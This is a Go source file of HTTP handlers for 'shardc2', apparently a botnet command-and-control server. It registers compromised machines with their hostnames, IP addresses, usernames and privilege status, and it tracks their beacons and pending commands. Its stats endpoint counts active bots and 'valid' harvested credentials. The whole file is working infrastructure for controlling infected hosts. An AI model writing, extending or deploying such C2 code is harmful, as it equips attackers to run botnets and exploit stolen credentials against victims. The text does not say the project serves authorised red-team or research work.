package handlers

import (
	"database/sql"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/shardc2/shardc2/internal/database"
)

type BotHandler struct {
	db *database.DB
}

func NewBotHandler(db *database.DB) *BotHandler {
	return &BotHandler{db: db}
}

func (h *BotHandler) Register(c *fiber.Ctx) error {
	var req struct {
		Hostname     string `json:"hostname"`
		IPAddress    string `json:"ip_address"`
		ExternalIP   string `json:"external_ip"`
		OS           string `json:"os"`
		Architecture string `json:"architecture"`
		Username     string `json:"username"`
		Privileged   bool   `json:"privileged"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}

	var botID string
	err := h.db.QueryRow(`
		INSERT INTO bots (hostname, ip_address, external_ip, os, architecture, username, privileged)
		VALUES ($1, $2, $3, $4, $5, $6, $7)
		RETURNING id`,
		req.Hostname, req.IPAddress, req.ExternalIP, req.OS, req.Architecture, req.Username, req.Privileged,
	).Scan(&botID)

	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to register bot"})
	}

	return c.Status(201).JSON(fiber.Map{
		"id":              botID,
		"beacon_interval": 60,
		"status":          "registered",
	})
}

func (h *BotHandler) Beacon(c *fiber.Ctx) error {
	var req struct {
		BotID string `json:"bot_id"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}

	result, err := h.db.Exec(`UPDATE bots SET last_seen = $1, status = 'active' WHERE id = $2`, time.Now(), req.BotID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "beacon update failed"})
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return c.Status(404).JSON(fiber.Map{"error": "bot not found"})
	}

	// Check for pending commands
	var pendingCount int
	h.db.QueryRow(`SELECT COUNT(*) FROM commands WHERE bot_id = $1 AND status = 'pending'`, req.BotID).Scan(&pendingCount)

	return c.JSON(fiber.Map{
		"status":           "ok",
		"pending_commands": pendingCount,
	})
}

func (h *BotHandler) List(c *fiber.Ctx) error {
	rows, err := h.db.Query(`
		SELECT id, hostname, ip_address, COALESCE(external_ip, ''), os, architecture,
		       COALESCE(username, ''), privileged, last_seen, status, beacon_interval, created_at
		FROM bots ORDER BY last_seen DESC`)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to list bots"})
	}
	defer rows.Close()

	var bots []fiber.Map
	for rows.Next() {
		var id, hostname, ip, extIP, os, arch, username, status string
		var privileged bool
		var lastSeen, createdAt time.Time
		var beaconInterval int
		if err := rows.Scan(&id, &hostname, &ip, &extIP, &os, &arch, &username, &privileged, &lastSeen, &status, &beaconInterval, &createdAt); err != nil {
			continue
		}
		bots = append(bots, fiber.Map{
			"id": id, "hostname": hostname, "ip_address": ip, "external_ip": extIP,
			"os": os, "architecture": arch, "username": username, "privileged": privileged,
			"last_seen": lastSeen, "status": status, "beacon_interval": beaconInterval, "created_at": createdAt,
		})
	}
	if bots == nil {
		bots = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"bots": bots, "count": len(bots)})
}

func (h *BotHandler) Get(c *fiber.Ctx) error {
	id := c.Params("id")
	var hostname, ip, extIP, os, arch, username, status string
	var privileged bool
	var lastSeen, createdAt time.Time
	var beaconInterval int

	err := h.db.QueryRow(`
		SELECT hostname, ip_address, COALESCE(external_ip, ''), os, architecture,
		       COALESCE(username, ''), privileged, last_seen, status, beacon_interval, created_at
		FROM bots WHERE id = $1`, id).Scan(
		&hostname, &ip, &extIP, &os, &arch, &username, &privileged, &lastSeen, &status, &beaconInterval, &createdAt,
	)
	if err == sql.ErrNoRows {
		return c.Status(404).JSON(fiber.Map{"error": "bot not found"})
	}
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to get bot"})
	}

	return c.JSON(fiber.Map{
		"id": id, "hostname": hostname, "ip_address": ip, "external_ip": extIP,
		"os": os, "architecture": arch, "username": username, "privileged": privileged,
		"last_seen": lastSeen, "status": status, "beacon_interval": beaconInterval, "created_at": createdAt,
	})
}

func (h *BotHandler) Remove(c *fiber.Ctx) error {
	id := c.Params("id")
	result, err := h.db.Exec(`DELETE FROM bots WHERE id = $1`, id)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to remove bot"})
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return c.Status(404).JSON(fiber.Map{"error": "bot not found"})
	}
	return c.JSON(fiber.Map{"status": "removed"})
}

func (h *BotHandler) Stats(c *fiber.Ctx) error {
	var totalBots, activeBots, pendingCmds, validCreds int

	h.db.QueryRow(`SELECT COUNT(*) FROM bots`).Scan(&totalBots)
	h.db.QueryRow(`SELECT COUNT(*) FROM bots WHERE status = 'active' AND last_seen > NOW() - INTERVAL '5 minutes'`).Scan(&activeBots)
	h.db.QueryRow(`SELECT COUNT(*) FROM commands WHERE status = 'pending'`).Scan(&pendingCmds)
	h.db.QueryRow(`SELECT COUNT(*) FROM credentials WHERE valid = true`).Scan(&validCreds)

	return c.JSON(fiber.Map{
		"total_bots":        totalBots,
		"active_bots":       activeBots,
		"pending_commands":  pendingCmds,
		"valid_credentials": validCreds,
	})
}
